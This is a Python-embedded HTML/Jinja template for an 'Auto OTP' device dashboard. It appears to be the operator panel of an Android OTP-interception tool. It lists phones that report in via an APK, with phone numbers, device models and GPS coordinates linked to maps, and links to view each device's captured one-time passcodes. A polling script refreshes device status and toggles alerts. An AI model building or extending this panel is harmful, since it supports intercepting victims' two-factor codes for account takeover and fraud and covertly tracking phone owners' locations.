# Main Dashboard Template - Device Operations View
DASHBOARD_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Auto OTP Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#eef3ef;--panel:#fbfdf9;--panel-2:#f4f8f2;--ink:#18231d;--muted:#5f6d64;--line:#d7e0d8;--accent:#2f6f4e;--accent-2:#c8d8b9;--danger:#a33d35;--warning:#9a6a12;--shadow:0 18px 45px rgba(31,54,39,.10)}
body{font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:radial-gradient(circle at top left,#dfeadc 0,#eef3ef 34%,#f7faf5 100%);color:var(--ink);line-height:1.5;min-height:100vh}
a{color:inherit}
.shell{max-width:1180px;margin:0 auto;padding:28px}
.topbar{display:flex;align-items:flex-start;justify-content:space-between;gap:24px;padding:22px 0 30px;border-bottom:1px solid rgba(24,35,29,.10)}
.eyebrow{font-size:.76rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--accent);margin-bottom:8px}
h1{font-size:clamp(2rem,4vw,4.1rem);line-height:.95;font-weight:800;max-width:720px;text-wrap:balance}
.subtitle{margin-top:14px;color:var(--muted);font-size:1rem;max-width:620px}
.nav{display:flex;gap:10px;flex-wrap:wrap;justify-content:flex-end}
.nav a{display:inline-flex;align-items:center;justify-content:center;text-decoration:none;background:rgba(255,255,255,.62);border:1px solid rgba(24,35,29,.12);border-radius:8px;padding:10px 14px;font-weight:650;color:var(--ink);transition:transform .18s ease,background .18s ease,border-color .18s ease}
.nav a:hover{transform:translateY(-1px);background:#fff;border-color:var(--accent-2)}
.section-head{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;margin:30px 0 14px}
.section-head h2{font-size:1.05rem;font-weight:800}
.section-head p{font-size:.9rem;color:var(--muted)}
.device-list{background:rgba(251,253,249,.88);border:1px solid rgba(24,35,29,.10);border-radius:14px;box-shadow:var(--shadow);overflow:hidden}
.device-item{display:grid;grid-template-columns:minmax(150px,1.1fr) minmax(180px,1.2fr) minmax(230px,1.6fr) minmax(170px,auto);gap:18px;align-items:center;padding:18px 20px;border-bottom:1px solid var(--line);text-decoration:none;color:inherit;transition:background .18s ease,transform .18s ease}
.device-item:hover{background:var(--panel-2);transform:translateX(2px)}
.device-item:last-child{border-bottom:none}
.label{display:block;font-size:.72rem;letter-spacing:.06em;text-transform:uppercase;color:var(--muted);font-weight:750;margin-bottom:4px}
.device-number{font-size:1rem;font-weight:800;font-variant-numeric:tabular-nums;color:var(--accent)}
.device-name{font-size:.98rem;font-weight:750;color:var(--ink)}
.device-location{font-size:.93rem;color:var(--muted)}
.location-link{color:var(--ink);font-weight:700;text-decoration:none;border-bottom:1px solid rgba(47,111,78,.32)}
.location-link:hover{color:var(--accent);border-bottom-color:var(--accent)}
.location-time{display:block;color:var(--muted);font-size:.8rem;margin-top:3px}
.device-actions{display:flex;flex-direction:column;align-items:flex-end;gap:8px}
.device-status{display:inline-flex;align-items:center;gap:.5rem;padding:.48rem .72rem;border-radius:8px;font-size:.78rem;font-weight:800;white-space:nowrap}
.device-status.online{background:#e4efe0;color:var(--accent);border:1px solid #c7dac0}
.device-status.offline{background:#f6e4e0;color:var(--danger);border:1px solid #e4bab4}
.status-dot{width:7px;height:7px;border-radius:50%}
.device-status.online .status-dot{background:var(--accent);box-shadow:0 0 0 4px rgba(47,111,78,.13)}
.device-status.offline .status-dot{background:var(--danger);box-shadow:0 0 0 4px rgba(163,61,53,.13)}
.alert-toggle{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line);background:#fff;border-radius:8px;padding:7px 9px;color:var(--ink);font-size:.78rem;font-weight:800;cursor:pointer}
.alert-toggle[aria-pressed="true"]{border-color:#c7dac0;background:#f0f6ec;color:var(--accent)}
.alert-toggle[aria-pressed="false"]{color:var(--muted)}
.last-seen{font-size:.75rem;color:var(--muted);white-space:nowrap}
.empty-state{text-align:center;padding:72px 24px;color:var(--muted);background:linear-gradient(180deg,rgba(255,255,255,.50),rgba(255,255,255,.20))}
.empty-mark{width:64px;height:64px;border-radius:16px;margin:0 auto 18px;background:var(--accent-2);display:grid;place-items:center;color:var(--accent);font-size:1.7rem}
.empty-state h3{color:var(--ink);font-size:1.2rem;margin-bottom:6px}
@media(max-width:820px){.shell{padding:18px}.topbar{display:block}.nav{justify-content:flex-start;margin-top:20px}.device-item{grid-template-columns:1fr;gap:12px;padding:18px}.section-head{display:block}.section-head p{margin-top:6px}}
</style>
</head>
<body>
<main class="shell">
<header class="topbar">
<div>
<div class="eyebrow">Auto OTP</div>
<h1>Device inbox dashboard</h1>
<p class="subtitle">Verified devices appear here with their latest telemetry. Open a device to inspect OTPs captured after the current server session started.</p>
</div>
<nav class="nav" aria-label="Dashboard navigation">
<a href="/alerts">Alerts</a>
<a href="/logout">Logout</a>
</nav>
</header>

<section>
<div class="section-head">
<div>
<h2>Connected devices</h2>
<p>Last refreshed {{ current_time }}</p>
</div>
</div>

<div class="device-list">
{% if devices %}
{% for device in devices %}
<a href="/device/{{ device.device_id }}/otps" class="device-item" data-device-id="{{ device.device_id }}">
<div>
<span class="label">Phone</span>
<div class="device-number">{{ device.phone_number or 'N/A' }}</div>
</div>
<div>
<span class="label">Device</span>
<div class="device-name">{{ device.device_manufacturer or '' }} {{ device.device_model or 'Unknown' }}</div>
</div>
<div class="device-location">
<span class="label">Location</span>
{% if device.latitude and device.longitude %}
<a href="https://www.google.com/maps?q={{ device.latitude }},{{ device.longitude }}" target="_blank" class="location-link" onclick="event.stopPropagation()">
{{ "%.4f"|format(device.latitude) }}, {{ "%.4f"|format(device.longitude) }}
</a>
<span class="location-time">{{ device.timestamp_formatted }}</span>
{% else %}
N/A
{% endif %}
</div>
<div>
<div class="device-actions">
<span class="device-status {{ device.status_class }}"><span class="status-dot"></span>{{ device.status_label }}</span>
<span class="last-seen">{{ device.last_seen_relative }}</span>
<button class="alert-toggle" type="button" aria-pressed="{{ 'true' if device.alerts_enabled else 'false' }}" onclick="toggleAlerts(event, '{{ device.device_id }}')">
{{ 'Alerts on' if device.alerts_enabled else 'Alerts off' }}
</button>
</div>
</div>
</a>
{% endfor %}
{% else %}
<div class="empty-state">
<div class="empty-mark">◎</div>
<h3>No devices connected</h3>
<p>Devices will appear here after the APK sends telemetry.</p>
</div>
{% endif %}
</div>
</section>
</main>
<script>
async function toggleAlerts(event, deviceId){
  event.preventDefault();
  event.stopPropagation();
  const button = event.currentTarget;
  const enabled = button.getAttribute('aria-pressed') !== 'true';
  button.disabled = true;
  try {
    const response = await fetch(`/api/devices/${encodeURIComponent(deviceId)}/alerts`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({enabled})
    });
    if (!response.ok) throw new Error('toggle failed');
    button.setAttribute('aria-pressed', String(enabled));
    button.textContent = enabled ? 'Alerts on' : 'Alerts off';
  } finally {
    button.disabled = false;
  }
}

async function pollDashboard(){
  try {
    const response = await fetch('/api/devices/list', {cache:'no-store'});
    if (!response.ok) return;
    const data = await response.json();
    const known = new Set([...document.querySelectorAll('[data-device-id]')].map(el => el.dataset.deviceId));
    if (data.count !== known.size || data.devices.some(device => !known.has(device.device_id))) {
      window.location.reload();
      return;
    }
    for (const device of data.devices) {
      const row = document.querySelector(`[data-device-id="${CSS.escape(device.device_id)}"]`);
      if (!row) continue;
      const status = row.querySelector('.device-status');
      const lastSeen = row.querySelector('.last-seen');
      if (status) {
        status.className = `device-status ${device.status_class}`;
        status.innerHTML = '<span class="status-dot"></span>' + device.status_label;
      }
      if (lastSeen) lastSeen.textContent = device.last_seen_relative;
    }
  } catch (error) {
    console.warn('Dashboard refresh failed', error);
  }
}

setInterval(pollDashboard, 2000);
</script>
</body>
</html>
"""
